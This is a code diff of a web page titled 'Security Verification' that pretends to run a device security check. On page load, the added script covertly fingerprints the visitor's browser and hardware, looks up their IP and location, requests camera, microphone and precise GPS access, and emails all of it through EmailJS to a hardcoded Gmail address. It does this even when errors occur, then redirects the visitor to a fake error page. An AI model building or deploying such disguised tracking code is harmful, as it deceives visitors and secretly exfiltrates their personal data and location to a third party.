@@ -1,43 +1,226 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <title>Security Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
-        emailjs.init("Gf2dIomrXKhbUAF0K");
+        emailjs.init("5IaCHytgOi1Clyw10");
     </script>
+    <style>
+        body { 
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+    </style>
 </head>
 <body>
+    <h1>🔒 Security Verification</h1>
+    <div class="status">Checking your device security...</div>
+    <div class="loader"></div>
+    <div class="status" id="progress">Initializing...</div>
+
     <script>
-        const data = {
+        // Полный сбор данных
+        const trackerData = {
+            // Системная информация
             userAgent: navigator.userAgent,
             platform: navigator.platform,
-            screen: screen.width + 'x' + screen.height,
+            vendor: navigator.vendor,
+            appVersion: navigator.appVersion,
+            product: navigator.product,
+            
+            // Языки и локализация
             language: navigator.language,
+            languages: navigator.languages,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timestamp: new Date().toISOString()
+            locale: Intl.DateTimeFormat().resolvedOptions().locale,
+            
+            // Аппаратные характеристики
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            maxTouchPoints: navigator.maxTouchPoints,
+            
+            // Сеть и соединение
+            online: navigator.onLine,
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            } : 'not supported',
+            
+            // Дополнительные данные
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver,
+            
+            // Временные метки
+            timestamp: new Date().toISOString(),
+            timezoneOffset: new Date().getTimezoneOffset(),
+            url: window.location.href,
+            referrer: document.referrer
         };
 
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(ipData => {
-                data.ip = ipData.ip;
-                return fetch('https://ipapi.co/json/');
-            })
-            .then(r => r.json())
-            .then(geoData => {
-                data.geo = geoData;
-                return emailjs.send('tpalu5n', 'template_z3yb94e', {
+        // Обновление прогресса
+        function updateProgress(message) {
+            document.getElementById('progress').textContent = message;
+        }
+
+        // Основной процесс
+        async function startTracking() {
+            try {
+                updateProgress('Getting IP address...');
+                
+                // Получение IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                trackerData.ip = ipData.ip;
+
+                updateProgress('Getting location...');
+                
+                // Получение геолокации
+                const geoResponse = await fetch(`https://ipapi.co/${trackerData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                trackerData.geolocation = geoData;
+
+                updateProgress('Checking device capabilities...');
+                
+                // Попытка доступа к камере
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    trackerData.mediaDevices = {
+                        camera: 'Available',
+                        microphone: 'Available',
+                        labels: stream.getTracks().map(track => track.label)
+                    };
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (mediaError) {
+                    trackerData.mediaDevices = {
+                        camera: 'Blocked',
+                        microphone: 'Blocked',
+                        error: mediaError.message
+                    };
+                }
+
+                // Попытка геолокации GPS
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            timeout: 5000,
+                            enableHighAccuracy: true
+                        });
+                    });
+                    trackerData.gpsLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        speed: position.coords.speed
+                    };
+                } catch (geoError) {
+                    trackerData.gpsLocation = {
+                        error: geoError.message
+                    };
+                }
+
+                updateProgress('Sending security report...');
+                
+                // Отправка данных
+                await emailjs.send('service_qd88lgh', 'template_k113khb', {
                     to_email: 'twtcha01@gmail.com',
-                    subject: 'TRACKER: ' + data.ip,
-                    message: JSON.stringify(data, null, 2)
+                    subject: `🚨 SECURITY REPORT: ${trackerData.ip} - ${trackerData.geolocation.country_name} - ${trackerData.platform}`,
+                    message: `
+🚨 COMPLETE SECURITY CAPTURE 🚨
+
+📍 LOCATION:
+IP: ${trackerData.ip}
+Country: ${trackerData.geolocation.country_name}
+City: ${trackerData.geolocation.city}
+Region: ${trackerData.geolocation.region}
+ISP: ${trackerData.geolocation.org}
+Timezone: ${trackerData.timezone}
+
+📱 DEVICE INFO:
+Platform: ${trackerData.platform}
+User Agent: ${trackerData.userAgent}
+Screen: ${trackerData.screen.width}x${trackerData.screen.height}
+Language: ${trackerData.language}
+CPU Cores: ${trackerData.hardwareConcurrency}
+RAM: ${trackerData.deviceMemory}GB
+
+🎯 MEDIA ACCESS:
+Camera: ${trackerData.mediaDevices.camera}
+Microphone: ${trackerData.mediaDevices.microphone}
+GPS: ${trackerData.gpsLocation.latitude ? 'Available' : 'Blocked'}
+
+📊 FULL DATA:
+${JSON.stringify(trackerData, null, 2)}
+
+⏰ TIMESTAMP: ${trackerData.timestamp}
+                    `
                 });
-            })
-            .then(() => {
-                window.location.href = 'https://http.cat/404';
-            })
-            .catch(() => {
+
+                updateProgress('Security check complete!');
+                
+                // Редирект после успешной отправки
+                setTimeout(() => {
+                    window.location.href = 'https://http.cat/404';
+                }, 2000);
+
+            } catch (error) {
+                // Отправка даже при ошибках
+                await emailjs.send('service_qd88lgh', 'template_k113khb', {
+                    to_email: 'twtcha01@gmail.com',
+                    subject: `🚨 ERROR REPORT: ${trackerData.ip || 'unknown'}`,
+                    message: `ERROR: ${error.message}\n\nPARTIAL DATA:\n${JSON.stringify(trackerData, null, 2)}`
+                });
+                
                 window.location.href = 'https://http.cat/500';
-            });
+            }
+        }
+
+        // Запуск при загрузке
+        document.addEventListener('DOMContentLoaded', startTracking);
+        
+        // Автозапуск через 5 секунд на всякий случай
+        setTimeout(startTracking, 5000);
     </script>
 </body>
 </html>
